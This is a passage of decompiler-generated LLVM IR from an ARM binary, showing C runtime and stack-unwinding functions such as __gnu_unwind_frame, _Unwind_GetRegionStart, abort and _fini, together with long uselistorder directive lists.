  uselistorder i32* @lr, { 5, 0, 171, 172, 173, 174, 182, 175, 176, 177, 178, 4, 179, 180, 181, 183, 184, 185, 186, 189, 187, 35, 36, 77, 37, 38, 39, 51, 40, 52, 41, 42, 43, 44, 45, 46, 1, 47, 2, 48, 49, 50, 188, 53, 54, 142, 143, 11, 12, 13, 14, 15, 16, 7, 17, 18, 19, 20, 21, 6, 22, 23, 24, 28, 29, 25, 26, 27, 144, 145, 146, 147, 148, 152, 149, 151, 78, 79, 9, 80, 84, 85, 86, 55, 56, 81, 82, 83, 153, 154, 63, 64, 158, 87, 88, 89, 193, 194, 90, 30, 155, 156, 157, 159, 160, 139, 140, 141, 161, 162, 163, 91, 92, 93, 3, 8, 94, 95, 96, 97, 190, 191, 192, 98, 107, 108, 99, 100, 101, 102, 103, 104, 105, 106, 31, 150, 65, 66, 67, 68, 10, 69, 70, 71, 72, 73, 74, 164, 165, 166, 60, 61, 62, 167, 168, 169, 170, 75, 76, 109, 110, 111, 112, 113, 117, 114, 115, 116, 118, 119, 120, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 33, 34, 121, 122, 136, 137, 138, 195, 196, 197, 57, 58, 59, 32, 198 }
  uselistorder i32* @r6, { 345, 346, 347, 358, 348, 33, 349, 12, 350, 351, 13, 352, 353, 354, 355, 356, 357, 359, 360, 5, 361, 362, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 14, 15, 306, 326, 307, 65, 308, 309, 314, 34, 35, 37, 36, 38, 16, 39, 40, 41, 42, 10, 44, 17, 43, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 18, 0, 66, 315, 316, 317, 325, 310, 311, 312, 313, 69, 1, 70, 71, 72, 73, 74, 124, 125, 126, 127, 128, 129, 130, 131, 132, 363, 364, 365, 75, 76, 327, 328, 19, 329, 330, 296, 303, 304, 305, 331, 332, 333, 334, 77, 78, 79, 335, 336, 133, 134, 20, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 11, 153, 154, 155, 21, 156, 157, 297, 299, 298, 300, 301, 302, 109, 110, 111, 112, 102, 103, 104, 101, 105, 158, 159, 160, 161, 162, 163, 164, 165, 166, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 167, 168, 169, 170, 171, 172, 173, 174, 192, 22, 193, 175, 176, 177, 178, 179, 180, 186, 187, 188, 189, 190, 191, 181, 182, 183, 184, 6, 185, 106, 23, 107, 108, 318, 319, 320, 322, 321, 323, 324, 113, 114, 115, 116, 194, 195, 196, 197, 198, 199, 200, 201, 2, 117, 118, 119, 120, 121, 122, 123, 202, 203, 204, 205, 337, 338, 339, 24, 340, 341, 342, 343, 344, 30, 31, 32, 206, 208, 209, 207, 210, 25, 211, 212, 26, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 27, 4, 228, 9, 229, 230, 231, 7, 232, 233, 8, 234, 80, 81, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 282, 283, 92, 93, 94, 3, 95, 96, 253, 254, 255, 256, 257, 28, 258, 259, 260, 261, 262, 263, 264, 265, 29, 266, 267, 268, 269, 278, 279, 280, 281, 270, 271, 272, 273, 274, 275, 276, 277, 97, 98, 99, 100, 376, 377, 378, 379, 67, 68 }
  uselistorder label %dec_label_pc_19048, { 1, 0 }
  uselistorder label %dec_label_pc_18fe4, { 1, 0 }
  uselistorder label %dec_label_pc_18f90, { 1, 0 }
  uselistorder label %dec_label_pc_18f68, { 1, 0 }
  uselistorder label %dec_label_pc_18ed4, { 1, 0 }
  uselistorder label %dec_label_pc_18eb8, { 1, 0 }
  uselistorder label %dec_label_pc_18e9c, { 1, 0 }
  uselistorder label %dec_label_pc_18e4c, { 1, 0 }
  uselistorder label %dec_label_pc_18e30, { 1, 0 }
  uselistorder label %dec_label_pc_18dac, { 1, 0 }
  uselistorder label %dec_label_pc_18d90, { 1, 0 }
  uselistorder label %dec_label_pc_18ccc, { 2, 4, 5, 3, 0, 6, 7, 1 }
  uselistorder label %dec_label_pc_18c9c, { 3, 4, 5, 0, 6, 2, 7, 1, 10, 11, 8, 9 }
  uselistorder label %dec_label_pc_18c84, { 1, 0 }
  uselistorder label %dec_label_pc_18c68, { 1, 0 }
  uselistorder label %dec_label_pc_189cc.backedge, { 2, 6, 4, 3, 5, 1, 0 }
  uselistorder label %dec_label_pc_18af4, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_18ae8, { 0, 2, 1 }
  uselistorder label %dec_label_pc_18adc, { 1, 0 }
  uselistorder label %bb148, { 1, 0 }
  uselistorder label %dec_label_pc_18a8c, { 1, 0 }
  uselistorder label %dec_label_pc_18a7c, { 1, 0 }
  uselistorder label %dec_label_pc_18a08, { 2, 1, 0 }
}

define i32 @__gnu_unwind_frame(i32 %ucbp, i32 %context) local_unnamed_addr {
entry:
  %uws_-20 = alloca %anon_struct_15.3, align 8
  %v1_190d0 = add i32 %ucbp, 76
  %v2_190d0 = inttoptr i32 %v1_190d0 to i32*
  %v3_190d0 = load i32, i32* %v2_190d0, align 4
  %v1_190d4 = add i32 %v3_190d0, 4
  %v2_190d4 = inttoptr i32 %v1_190d4 to i32*
  %v3_190d4 = load i32, i32* %v2_190d4, align 4
  %v3_190dc = mul i32 %v3_190d4, 256
  %v4_190e4 = getelementptr inbounds %anon_struct_15.3, %anon_struct_15.3* %uws_-20, i32 0, i32 0
  store i32 %v3_190dc, i32* %v4_190e4, align 8
  %tmp7 = bitcast %anon_struct_15.3* %uws_-20 to %anon_struct_15*
  %v4_19104 = call i32 @__gnu_unwind_execute(i32 %context, %anon_struct_15* %tmp7)
  ret i32 %v4_19104

; uselistorder directives
  uselistorder %anon_struct_15.3* %uws_-20, { 1, 0 }
  uselistorder i32 (i32, %anon_struct_15*)* @__gnu_unwind_execute, { 1, 0 }
  uselistorder i32 256, { 4, 5, 7, 6, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 80, 0, 1, 76, 77, 78, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 2, 3, 67, 73, 79, 68, 69, 70, 71, 72, 74, 75 }
  uselistorder i32 4, { 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 115, 364, 365, 366, 367, 368, 14, 371, 372, 369, 370, 373, 15, 374, 375, 376, 377, 16, 394, 17, 378, 379, 380, 381, 382, 18, 383, 19, 384, 385, 386, 387, 388, 389, 390, 20, 391, 127, 392, 393, 395, 396, 397, 398, 21, 399, 22, 400, 403, 23, 24, 25, 154, 401, 402, 155, 26, 27, 183, 337, 128, 129, 159, 160, 161, 162, 28, 163, 164, 29, 165, 166, 130, 30, 31, 32, 167, 168, 169, 95, 33, 170, 171, 172, 126, 131, 338, 339, 340, 132, 341, 133, 173, 134, 211, 212, 184, 156, 214, 213, 217, 135, 218, 219, 34, 136, 220, 35, 221, 404, 116, 343, 117, 344, 36, 37, 38, 39, 40, 41, 42, 0, 215, 216, 1, 43, 44, 45, 345, 346, 46, 47, 48, 49, 342, 185, 186, 187, 188, 204, 101, 137, 119, 118, 176, 177, 178, 347, 120, 222, 223, 113, 224, 225, 226, 227, 104, 228, 229, 230, 231, 232, 233, 234, 174, 235, 236, 237, 238, 51, 50, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 2, 105, 106, 435, 3, 433, 434, 121, 348, 250, 251, 205, 206, 52, 53, 54, 55, 252, 253, 56, 57, 436, 437, 438, 58, 254, 255, 5, 59, 4, 60, 61, 62, 63, 64, 405, 406, 407, 408, 409, 410, 411, 413, 414, 412, 415, 416, 417, 65, 418, 107, 419, 157, 420, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 66, 67, 6, 256, 7, 68, 69, 138, 139, 70, 266, 267, 71, 140, 259, 141, 263, 264, 265, 261, 262, 72, 260, 257, 94, 258, 201, 268, 269, 270, 271, 207, 208, 209, 189, 190, 349, 142, 350, 351, 352, 143, 353, 73, 272, 74, 273, 75, 274, 275, 76, 114, 108, 110, 278, 122, 8, 96, 9, 103, 280, 123, 281, 282, 283, 284, 124, 144, 145, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 179, 180, 181, 182, 279, 295, 146, 296, 147, 148, 77, 297, 298, 299, 300, 301, 302, 149, 303, 78, 102, 191, 192, 193, 194, 195, 196, 197, 198, 13, 79, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 125, 318, 319, 320, 321, 322, 323, 330, 334, 335, 336, 324, 325, 326, 327, 328, 329, 331, 332, 333, 439, 150, 440, 441, 97, 151, 276, 277, 158, 80, 81, 109, 82, 83, 84, 85, 86, 87, 88, 199, 89, 152, 98, 111, 99, 100, 10, 11, 112, 200, 90, 202, 203, 91, 175, 210, 92, 93, 12, 153, 442 }
  uselistorder i32 76, { 13, 14, 15, 16, 17, 18, 12, 0, 11, 9, 10, 3, 1, 7, 4, 5, 2, 6, 8 }
  uselistorder i32 1, { 618, 1251, 1252, 492, 1256, 1257, 1258, 1259, 524, 1260, 1261, 431, 442, 525, 1253, 1254, 1255, 1262, 493, 1263, 619, 155, 160, 158, 156, 161, 157, 159, 620, 621, 622, 623, 526, 527, 1264, 1265, 407, 626, 625, 624, 176, 178, 177, 179, 181, 180, 629, 628, 627, 165, 528, 529, 154, 1266, 182, 1267, 633, 632, 631, 630, 294, 1268, 1269, 1270, 1271, 635, 634, 307, 309, 310, 308, 311, 1275, 443, 1276, 1272, 1273, 1274, 426, 444, 267, 268, 262, 263, 1004, 1005, 445, 0, 446, 236, 237, 235, 496, 518, 519, 497, 918, 904, 905, 636, 201, 203, 202, 206, 205, 207, 200, 204, 919, 637, 920, 638, 79, 81, 77, 78, 80, 331, 152, 151, 447, 330, 639, 332, 333, 906, 907, 63, 62, 908, 334, 335, 336, 640, 187, 188, 183, 184, 185, 186, 399, 1277, 324, 323, 909, 910, 911, 912, 913, 914, 915, 916, 917, 641, 56, 53, 52, 51, 57, 54, 55, 337, 339, 338, 216, 921, 448, 922, 645, 644, 643, 642, 45, 44, 43, 433, 432, 1217, 450, 1218, 1219, 418, 872, 531, 873, 530, 417, 874, 502, 875, 876, 427, 877, 451, 878, 879, 880, 881, 488, 1, 882, 408, 883, 884, 885, 886, 887, 888, 532, 889, 501, 491, 434, 890, 891, 892, 893, 894, 895, 896, 617, 1220, 1221, 500, 1223, 1224, 1225, 1226, 449, 1227, 499, 1228, 1229, 1231, 1230, 1232, 494, 658, 657, 656, 607, 605, 606, 655, 654, 653, 652, 608, 651, 650, 649, 648, 647, 646, 341, 342, 343, 344, 346, 347, 350, 349, 345, 348, 340, 2, 659, 249, 660, 1222, 93, 91, 92, 661, 162, 662, 663, 352, 355, 351, 353, 354, 199, 198, 409, 410, 1010, 1011, 533, 1012, 1013, 413, 1014, 420, 1015, 1016, 1017, 1018, 1019, 1020, 1006, 1007, 1008, 1009, 665, 664, 314, 313, 315, 312, 316, 534, 666, 1027, 1028, 1029, 1030, 1031, 1032, 1033, 361, 359, 360, 358, 356, 357, 363, 362, 503, 1278, 535, 504, 667, 189, 190, 944, 945, 536, 946, 947, 669, 668, 299, 300, 298, 948, 317, 949, 950, 537, 538, 951, 672, 671, 670, 149, 1021, 1022, 1023, 1025, 1026, 1024, 673, 365, 364, 366, 1240, 1241, 489, 490, 1242, 1243, 1244, 367, 452, 1233, 675, 674, 369, 368, 1034, 1035, 609, 246, 140, 139, 676, 141, 146, 143, 142, 144, 145, 400, 401, 1216, 677, 506, 505, 539, 996, 138, 678, 136, 137, 923, 679, 540, 898, 899, 900, 429, 541, 901, 682, 681, 680, 134, 1245, 542, 543, 688, 687, 686, 685, 684, 683, 370, 1036, 1037, 544, 1038, 545, 691, 690, 689, 610, 611, 371, 372, 421, 1039, 1041, 1040, 1042, 1044, 1043, 274, 273, 275, 278, 271, 277, 272, 276, 924, 925, 926, 927, 928, 929, 930, 428, 692, 250, 260, 254, 251, 261, 257, 258, 259, 252, 253, 255, 256, 693, 1045, 696, 695, 694, 135, 1046, 1047, 495, 1048, 430, 697, 127, 125, 131, 132, 128, 129, 130, 133, 126, 698, 373, 699, 1049, 700, 296, 297, 295, 701, 318, 319, 320, 321, 322, 1050, 1051, 453, 1052, 1053, 1054, 1055, 1056, 1057, 1058, 1059, 1060, 546, 1061, 1062, 1063, 702, 113, 111, 112, 110, 454, 239, 238, 547, 1294, 455, 3, 4, 5, 703, 704, 329, 328, 705, 196, 548, 706, 386, 387, 707, 233, 232, 549, 97, 96, 95, 94, 708, 68, 69, 67, 456, 997, 550, 709, 70, 508, 507, 551, 710, 952, 711, 173, 172, 174, 175, 1065, 1066, 1064, 1067, 1068, 1069, 1070, 437, 1071, 11, 12, 1072, 419, 435, 436, 13, 14, 1073, 1074, 552, 8, 1075, 7, 10, 1076, 6, 9, 1077, 1078, 1079, 713, 712, 90, 89, 82, 84, 85, 88, 86, 87, 83, 171, 1081, 1082, 1080, 61, 1083, 1084, 714, 374, 715, 58, 931, 932, 60, 59, 987, 988, 716, 50, 49, 1295, 440, 717, 377, 378, 382, 375, 376, 379, 380, 381, 1085, 1086, 1087, 1088, 1089, 1090, 1091, 1092, 46, 47, 48, 1279, 1280, 1281, 1282, 1283, 1284, 1285, 1286, 1287, 1288, 1289, 1290, 1291, 1292, 1293, 718, 35, 29, 30, 31, 32, 39, 33, 41, 37, 42, 36, 34, 38, 40, 1095, 1093, 1094, 1097, 1096, 15, 16, 1098, 1099, 17, 18, 19, 20, 28, 509, 719, 458, 459, 553, 1102, 1100, 1101, 511, 510, 460, 1103, 1104, 457, 1105, 1111, 461, 722, 721, 720, 191, 192, 1108, 512, 1106, 1107, 441, 724, 723, 26, 27, 513, 1110, 726, 725, 285, 1109, 514, 727, 301, 554, 991, 992, 422, 993, 728, 226, 729, 163, 164, 555, 99, 98, 1112, 1113, 21, 1114, 515, 1115, 730, 118, 117, 119, 121, 120, 284, 731, 193, 194, 195, 732, 122, 124, 123, 733, 734, 933, 735, 241, 244, 245, 242, 240, 243, 736, 306, 303, 304, 305, 737, 234, 153, 556, 197, 557, 516, 558, 22, 23, 1246, 742, 741, 740, 739, 738, 384, 383, 385, 743, 1247, 1248, 559, 1249, 752, 751, 750, 749, 748, 747, 746, 745, 744, 615, 1001, 753, 397, 396, 395, 326, 325, 327, 562, 1116, 1117, 1118, 1119, 1120, 1121, 561, 1122, 1123, 1124, 1127, 517, 1128, 1129, 560, 1130, 1131, 1132, 563, 770, 769, 768, 767, 766, 765, 612, 764, 763, 762, 761, 760, 759, 758, 757, 756, 755, 754, 248, 247, 771, 1133, 24, 1134, 1135, 462, 775, 774, 773, 772, 148, 147, 1136, 1137, 1138, 564, 1143, 1144, 1145, 1146, 402, 416, 1148, 1147, 415, 1149, 463, 1150, 424, 1151, 1152, 423, 498, 1153, 1154, 1157, 1158, 414, 1159, 1160, 1161, 1162, 1163, 1164, 1165, 425, 1166, 804, 803, 802, 801, 800, 799, 798, 797, 796, 795, 794, 793, 792, 791, 790, 789, 788, 787, 786, 785, 784, 783, 782, 781, 780, 779, 778, 777, 776, 101, 100, 102, 103, 105, 104, 106, 1142, 292, 289, 291, 286, 293, 287, 288, 290, 565, 902, 903, 805, 107, 109, 108, 1155, 1156, 806, 1139, 1140, 1141, 115, 114, 403, 1167, 1168, 1169, 1170, 807, 613, 116, 808, 1171, 1172, 1173, 1174, 464, 897, 811, 810, 809, 71, 76, 72, 73, 74, 75, 566, 812, 813, 280, 283, 282, 279, 281, 934, 935, 936, 937, 938, 465, 939, 229, 228, 230, 227, 231, 940, 270, 269, 466, 1175, 469, 470, 569, 1176, 468, 1177, 1178, 1179, 1180, 1181, 570, 1182, 571, 1184, 467, 1183, 568, 1186, 567, 1185, 1187, 1188, 572, 1189, 1190, 1191, 471, 573, 1192, 814, 388, 390, 393, 392, 391, 394, 389, 576, 1193, 577, 575, 574, 1194, 1195, 472, 473, 474, 1196, 438, 439, 1212, 1213, 1214, 1215, 166, 167, 169, 168, 170, 478, 479, 580, 1197, 477, 1198, 1199, 1200, 480, 579, 1202, 578, 1201, 475, 476, 1203, 1204, 815, 225, 217, 223, 220, 218, 222, 221, 219, 224, 483, 484, 583, 1205, 1206, 1207, 1208, 582, 581, 1209, 481, 482, 1210, 1211, 816, 212, 210, 211, 208, 214, 213, 209, 215, 485, 941, 487, 942, 943, 817, 264, 265, 266, 584, 1296, 1297, 1298, 820, 819, 818, 66, 64, 65, 1125, 404, 1126, 953, 954, 955, 956, 957, 958, 588, 959, 960, 411, 586, 587, 589, 961, 590, 585, 962, 963, 829, 828, 827, 826, 825, 824, 823, 822, 821, 594, 591, 592, 593, 595, 596, 833, 832, 831, 830, 835, 834, 964, 965, 966, 967, 968, 969, 970, 971, 972, 973, 836, 614, 837, 838, 974, 405, 412, 975, 976, 977, 978, 406, 979, 980, 981, 982, 983, 984, 985, 986, 841, 840, 839, 302, 989, 597, 598, 599, 844, 843, 842, 990, 845, 994, 600, 849, 848, 847, 846, 601, 602, 995, 603, 604, 858, 857, 856, 855, 854, 853, 852, 851, 850, 150, 998, 999, 1000, 860, 859, 861, 486, 1002, 25, 1003, 862, 864, 863, 865, 521, 1234, 1235, 520, 1236, 1237, 522, 523, 1238, 1239, 866, 1250, 869, 868, 867, 870, 871, 398, 616 }
}

define i32 @_Unwind_GetRegionStart(i32 %context) local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %v5_19130 = call i32 @_Unwind_VRS_Get(i32 12, i32 0, i32 12, i32 0, i8* bitcast (i32* @0 to i8*))
  %v1_19138 = add i32 %tmp1, 72
  %v2_19138 = inttoptr i32 %v1_19138 to i32*
  %v3_19138 = load i32, i32* %v2_19138, align 4
  ret i32 %v3_19138

; uselistorder directives
  uselistorder i32 72, { 1, 2, 0, 3 }
  uselistorder i32 (i32, i32, i32, i32, i8*)* @_Unwind_VRS_Get, { 10, 8, 7, 6, 5, 9, 4, 3, 2, 1, 0 }
  uselistorder i8* bitcast (i32* @0 to i8*), { 0, 3, 4, 7, 5, 6, 1, 2, 8, 14, 13, 10, 11, 9, 12, 15, 16, 17 }
  uselistorder i32 12, { 3, 2, 5, 4, 79, 80, 81, 82, 0, 6, 28, 27, 22, 23, 36, 34, 25, 26, 37, 7, 38, 39, 95, 96, 97, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 8, 35, 40, 41, 9, 10, 12, 43, 11, 44, 45, 46, 47, 48, 49, 50, 51, 42, 52, 53, 54, 13, 14, 29, 15, 55, 56, 57, 58, 16, 59, 60, 17, 61, 62, 18, 63, 64, 65, 66, 77, 67, 68, 69, 70, 71, 72, 19, 73, 74, 20, 75, 76, 1, 30, 31, 32, 33, 24, 78, 21 }
}

define i32 @abort() local_unnamed_addr {
entry:
  %v1_1914c = call i32 @raise(i32 6)
  %v1_19154 = call i32 @raise(i32 9)
  br label %dec_label_pc_19158

dec_label_pc_19158:                               ; preds = %dec_label_pc_19158, %entry
  br label %dec_label_pc_19158

; uselistorder directives
  uselistorder i32 9, { 24, 55, 56, 57, 58, 59, 60, 61, 62, 64, 65, 66, 67, 63, 12, 13, 14, 15, 16, 68, 69, 70, 71, 17, 72, 0, 1, 2, 9, 73, 74, 54, 23, 38, 39, 40, 25, 26, 18, 41, 27, 28, 11, 19, 20, 21, 29, 42, 22, 30, 10, 31, 43, 44, 4, 3, 5, 47, 46, 48, 49, 50, 51, 52, 32, 37, 6, 53, 7, 8, 33, 45, 34, 35, 36 }
  uselistorder i32 (i32)* @raise, { 1, 0, 2 }
  uselistorder i32 6, { 6, 18, 0, 5, 1, 2, 10, 7, 11, 12, 13, 14, 3, 16, 17, 4, 8, 19, 15, 20, 9 }
}

define i32 @_fini() local_unnamed_addr {
entry:
  %v3_1915c = load i32, i32* @r0, align 4
  ret i32 %v3_1915c

; uselistorder directives
  uselistorder i32 0, { 483, 482, 538, 539, 2276, 487, 486, 540, 2277, 2278, 2279, 2280, 436, 435, 541, 2281, 2282, 278, 2283, 2285, 2286, 207, 208, 2287, 2288, 2284, 120, 121, 122, 123, 2, 1, 3, 0, 267, 266, 268, 269, 270, 2289, 484, 485, 189, 178, 2290, 2291, 272, 273, 271, 274, 2292, 2293, 2294, 2295, 277, 276, 275, 2296, 2297, 2298, 469, 468, 542, 488, 543, 489, 544, 490, 545, 546, 547, 2299, 504, 503, 2300, 2301, 502, 501, 2302, 548, 499, 500, 497, 498, 496, 495, 2303, 494, 493, 492, 491, 439, 2304, 2320, 2305, 281, 2306, 2307, 2308, 2309, 2310, 2311, 283, 2313, 2314, 279, 280, 2315, 2316, 174, 209, 2317, 2318, 1261, 124, 125, 470, 471, 282, 2312, 2319, 438, 2321, 549, 550, 2322, 506, 505, 284, 2323, 2324, 285, 2325, 2326, 2327, 153, 551, 552, 2328, 286, 2329, 210, 2330, 2331, 287, 2332, 2333, 2334, 2335, 2336, 2337, 2338, 2339, 2340, 2341, 56, 175, 553, 2342, 288, 2343, 2344, 2345, 4, 2346, 2347, 5, 2348, 2349, 2363, 293, 2364, 6, 2365, 294, 289, 290, 2366, 292, 2367, 291, 2379, 2350, 303, 2351, 7, 2352, 304, 211, 1262, 2353, 213, 2354, 1263, 2355, 2356, 296, 295, 297, 2357, 1264, 2358, 2359, 302, 299, 300, 301, 298, 554, 212, 2360, 214, 215, 2361, 2362, 1734, 1735, 251, 201, 202, 1736, 1737, 1738, 1739, 1740, 8, 1454, 1452, 1453, 1455, 1456, 555, 1741, 1742, 9, 1457, 1458, 1459, 1265, 1460, 1461, 1462, 1463, 1464, 10, 1465, 1466, 1467, 1468, 1469, 1266, 11, 1470, 1267, 1268, 1471, 1472, 1473, 1474, 1475, 1476, 1477, 57, 12, 1478, 13, 1479, 1480, 1269, 14, 1481, 1482, 15, 1483, 1484, 534, 535, 1546, 1547, 1548, 1549, 1550, 1551, 1552, 17, 18, 19, 1485, 1486, 16, 1487, 1488, 1270, 20, 1489, 1490, 58, 1271, 1491, 1492, 1493, 1494, 1495, 1496, 1497, 1498, 141, 140, 305, 306, 307, 1499, 1500, 1501, 21, 1553, 1554, 59, 1555, 1556, 1557, 60, 61, 252, 1558, 1559, 1560, 1561, 62, 253, 556, 1562, 1563, 1564, 1565, 1566, 1567, 63, 1568, 23, 22, 64, 1272, 1569, 1274, 1273, 1570, 1571, 1572, 1573, 1574, 24, 1502, 1503, 1504, 1505, 1506, 1507, 1508, 1509, 1510, 1511, 1275, 1512, 1513, 1514, 1515, 1516, 1517, 25, 1518, 1276, 1519, 1520, 1521, 1522, 254, 255, 557, 1523, 1524, 27, 26, 1525, 1526, 1527, 1528, 1529, 1530, 1531, 1277, 1278, 1532, 1280, 1533, 1534, 1281, 1282, 1535, 1536, 1279, 1537, 1283, 1538, 1284, 1539, 1540, 1541, 1542, 1543, 28, 2368, 2370, 2371, 190, 2372, 2373, 2374, 2375, 2376, 308, 2377, 1285, 1288, 1286, 1287, 2378, 1289, 1544, 1575, 1576, 1577, 309, 1545, 440, 1578, 310, 2170, 2171, 558, 2172, 2173, 2174, 2175, 2176, 2185, 2186, 2187, 2225, 2226, 507, 142, 559, 1398, 78, 2188, 2189, 2190, 2191, 2192, 2193, 473, 2194, 2197, 2198, 2199, 2200, 2201, 1315, 1316, 312, 1321, 1317, 1318, 1319, 563, 1320, 311, 1325, 1322, 1323, 565, 1324, 1326, 564, 1327, 1328, 191, 322, 472, 1329, 1330, 1331, 1332, 154, 1333, 79, 155, 313, 1334, 1335, 1336, 1337, 1338, 1339, 1340, 65, 1341, 1342, 1343, 192, 1344, 1345, 1346, 1347, 1348, 1349, 1350, 1351, 29, 30, 1352, 216, 1353, 1354, 1355, 1356, 1357, 1358, 1359, 126, 1360, 1367, 1361, 1362, 1365, 561, 1363, 562, 1364, 1366, 80, 1368, 1369, 1370, 1371, 1395, 1396, 319, 320, 318, 1372, 1373, 1374, 1375, 1376, 1377, 1378, 1379, 321, 1380, 1381, 1382, 1383, 1384, 261, 262, 263, 264, 66, 260, 149, 1385, 1386, 1387, 1388, 1389, 1390, 1391, 566, 567, 323, 324, 314, 1392, 1393, 67, 68, 1394, 81, 1397, 77, 1399, 1400, 82, 83, 560, 1401, 1402, 568, 1403, 1404, 1416, 1417, 1418, 180, 1419, 127, 1405, 1406, 1407, 1408, 315, 1409, 1410, 204, 1411, 1412, 1413, 1414, 1415, 1260, 1420, 2202, 2203, 2204, 217, 2205, 316, 2206, 2207, 2209, 2210, 325, 317, 2211, 2212, 2213, 2214, 2222, 2223, 2224, 508, 509, 2221, 569, 2195, 2196, 2220, 2208, 441, 1423, 1424, 570, 1422, 510, 156, 157, 1743, 571, 1744, 1745, 1580, 442, 1579, 128, 129, 331, 330, 572, 1747, 1748, 1749, 1750, 1751, 332, 1752, 158, 143, 1753, 1754, 465, 1758, 1757, 1755, 1756, 1759, 328, 329, 1760, 326, 327, 69, 333, 1761, 1746, 218, 1762, 1770, 573, 1771, 1772, 1773, 1290, 1774, 1775, 1776, 1777, 1778, 1779, 1780, 1781, 1782, 1783, 159, 1784, 334, 1785, 443, 1786, 1787, 335, 1788, 1789, 1790, 2380, 444, 2381, 574, 575, 576, 2234, 2235, 2236, 2237, 338, 337, 336, 511, 577, 2238, 2239, 1616, 1617, 1618, 339, 340, 1619, 1620, 1621, 1622, 341, 1763, 1764, 1765, 1766, 1767, 1768, 1769, 2240, 446, 2241, 445, 2242, 256, 2227, 2228, 2229, 1683, 1791, 2215, 342, 193, 1581, 467, 1582, 84, 2184, 578, 2183, 160, 161, 2169, 579, 1684, 1685, 1686, 344, 1687, 1688, 1689, 1690, 1691, 1692, 1693, 343, 1694, 1695, 345, 1583, 1291, 1584, 31, 32, 33, 34, 2243, 35, 1425, 580, 1426, 1427, 1428, 1432, 1429, 1430, 1431, 1433, 1434, 1435, 346, 1436, 1437, 348, 349, 1438, 347, 1439, 581, 1440, 1441, 1442, 1443, 1444, 2244, 2245, 219, 2246, 350, 2247, 2248, 2249, 351, 2250, 130, 1792, 1793, 1794, 1795, 1796, 1797, 1798, 1799, 582, 1800, 352, 85, 176, 463, 447, 1292, 1801, 1802, 1803, 1293, 162, 1585, 1586, 1587, 1588, 1589, 86, 194, 221, 220, 1804, 1805, 222, 353, 131, 532, 512, 513, 1806, 1807, 355, 354, 1808, 1809, 1810, 1811, 1812, 1813, 1814, 1815, 356, 1816, 1817, 1818, 1819, 1820, 1821, 361, 362, 363, 364, 365, 1822, 360, 357, 358, 359, 1823, 1824, 87, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 1825, 367, 366, 368, 1826, 203, 1827, 2369, 1828, 1829, 1830, 583, 1831, 1832, 592, 593, 594, 1833, 587, 588, 589, 1834, 1835, 590, 591, 1836, 595, 596, 597, 1837, 1838, 1839, 1840, 600, 1841, 1842, 372, 373, 1843, 1844, 374, 1845, 1846, 585, 584, 1847, 1848, 1849, 132, 1850, 1853, 88, 89, 1851, 1852, 601, 1854, 1855, 369, 370, 514, 598, 1856, 599, 586, 1857, 1858, 375, 371, 1859, 205, 133, 1860, 1861, 1862, 1863, 233, 1864, 1865, 234, 235, 2383, 2382, 2384, 376, 377, 437, 2420, 2421, 379, 378, 448, 602, 2419, 380, 1421, 603, 604, 605, 381, 2251, 134, 1623, 1624, 1625, 1626, 36, 476, 475, 474, 515, 516, 606, 607, 1670, 608, 382, 1445, 1446, 1867, 609, 1866, 163, 164, 1868, 610, 611, 1869, 2252, 2253, 2254, 37, 38, 2255, 236, 1870, 2177, 2178, 2180, 2181, 1294, 165, 181, 2182, 2179, 1696, 1697, 1698, 1699, 612, 1700, 1627, 1628, 1629, 1871, 1872, 1873, 1874, 90, 91, 92, 179, 1876, 195, 1877, 41, 42, 43, 44, 384, 1878, 383, 1875, 613, 1879, 40, 1880, 39, 1881, 237, 238, 239, 240, 1882, 614, 182, 241, 1883, 615, 1885, 1884, 1886, 1887, 1888, 449, 1889, 385, 2422, 2423, 2424, 2425, 1890, 1295, 1891, 1892, 1296, 1297, 1893, 1894, 1895, 1896, 1305, 1298, 2385, 2386, 2387, 1299, 2388, 2389, 150, 151, 152, 2390, 2391, 2392, 2393, 2394, 2395, 2396, 2397, 2398, 2399, 2400, 2401, 1306, 1300, 2402, 2403, 2404, 2405, 1301, 2406, 1302, 2407, 2408, 2409, 2410, 2411, 1303, 2412, 2413, 2414, 2415, 1307, 1304, 2416, 2417, 2418, 45, 1897, 1898, 1899, 1900, 1901, 1902, 450, 242, 243, 1903, 1904, 46, 1905, 1906, 47, 1907, 48, 1908, 1671, 1911, 1590, 1909, 388, 518, 517, 387, 386, 1910, 389, 1308, 390, 1912, 519, 1925, 1913, 1915, 1917, 1918, 1919, 49, 50, 1914, 1922, 1923, 1924, 1920, 451, 1921, 51, 196, 197, 391, 1916, 1672, 1673, 392, 244, 1630, 1631, 1632, 177, 452, 2216, 2217, 2218, 2219, 135, 136, 1701, 1702, 1703, 1704, 1705, 1926, 1927, 1928, 1935, 1929, 1930, 1931, 1932, 1933, 1934, 1936, 1937, 1938, 453, 245, 1939, 1940, 1941, 1708, 1706, 1707, 454, 1709, 265, 1710, 1711, 1715, 1716, 1717, 393, 616, 1712, 1713, 617, 1714, 1633, 1634, 1635, 1718, 1719, 52, 1720, 1721, 1722, 1723, 1724, 1591, 